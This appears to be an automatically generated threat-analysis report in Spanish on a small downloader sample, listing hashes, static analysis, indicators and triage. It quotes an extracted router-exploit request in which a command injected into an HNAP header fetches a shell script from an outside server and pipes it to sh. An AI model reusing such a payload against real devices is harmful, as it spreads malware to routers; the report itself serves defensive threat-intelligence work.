# 🧬 Payload Analysis

`afabe26fa1765a5e327dcac4c1256e512986654b06ba78d1ada8b8002cbf42c5`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asociaron 2 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `afabe26fa1765a5e327dcac4c1256e512986654b06ba78d1ada8b8002cbf42c5`
- **SHA1:** `0d72e21d040faf6a8e10bd981f6368b2da5f376f`
- **MD5:** `21735135838d13459fc61849a4a1567e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 477 B |
| Entropía | 5.11 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
GET /HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dhnap2;busybox wget hxxp://91.92.40.XXX
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dhnap2;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
| hash | afabe26fa1765a5e327dcac4c1256e512986654b06ba78d1ada8b8002cbf42c5 | static_analysis |
| command | GET /HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2;busybox wget hxxp://91.92.40.XXX | strings |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2; | strings |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
